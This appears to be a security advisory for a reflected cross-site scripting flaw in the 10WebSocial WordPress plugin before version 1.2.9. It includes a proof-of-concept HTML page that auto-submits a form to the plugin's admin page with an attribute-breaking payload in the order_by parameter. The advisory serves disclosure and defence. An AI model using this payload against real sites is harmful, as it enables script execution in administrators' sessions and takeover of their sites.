## WordPress Plugin Vulnerabilities

# 10WebSocial < 1.2.9 - Reflected XSS

### Description

The plugin does not sanitise and escape some parameter before outputting it back in a page, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin

### Proof of Concept

Make a logged in admin open a page with the code below
<html>
<body onload="document.forms[0].submit()">
<form action="https://example.com/wp-admin/admin.php?page=info\_ffwd" method="POST">
<input type="hidden" name="order\_by" value='" accesskey=X onclick=alert(/XSS/)//' />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
The XSS will be triggered when pressing ALT+SHIFT+X on Windows and CTRL+ALT+X on OS X
